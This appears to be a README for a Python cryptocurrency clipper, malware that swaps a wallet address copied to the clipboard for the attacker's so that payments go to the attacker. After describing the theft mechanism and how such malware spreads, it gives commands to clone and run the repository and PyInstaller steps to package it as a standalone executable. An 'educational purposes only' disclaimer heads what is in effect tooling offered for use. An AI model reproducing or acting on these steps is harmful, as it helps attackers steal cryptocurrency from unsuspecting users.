# What is a crypto clipper?

```diff
- Remember, this is for educaitonal purposes ONLY and I am NOT responsible for any damages.
```
A crypto clipper, also known as a cryptocurrency clipper, is a type of malware or malicious software designed to exploit cryptocurrency transactions. This type of malware typically operates by intercepting cryptocurrency addresses copied to the clipboard (hence the term "clipper").

Here's how it works:

1) **Clipboard Monitoring**: When a user copies a cryptocurrency wallet address to their clipboard (such as Bitcoin or Ethereum address), perhaps intending to paste it into a cryptocurrency transaction form or wallet app, the clipper malware monitors the clipboard for any copied addresses.

2) **Address Replacement**: Once the malware detects a copied cryptocurrency address, it replaces it with the attacker's address. So, when the user pastes the address into the intended destination, they unwittingly paste the attacker's address instead of the intended recipient's.

3) **Unauthorized Transactions**: As a result of the address substitution, any cryptocurrency transactions initiated by the user would actually send funds to the attacker's wallet rather than the intended recipient. This enables the attacker to steal cryptocurrency from unsuspecting users.

# How does it spread
Crypto clippers can be distributed through various means such as malicious websites, phishing emails, or compromised software downloads. They are particularly insidious because they can operate silently in the background

## How to use
```
git clone https://github.com/kneeling/Python-Crypto-Clipper.git 
python3 main.py
```

# To convert to .exe/.app

```
pip install pyinstaller
pyinstaller main.py --onefile
```
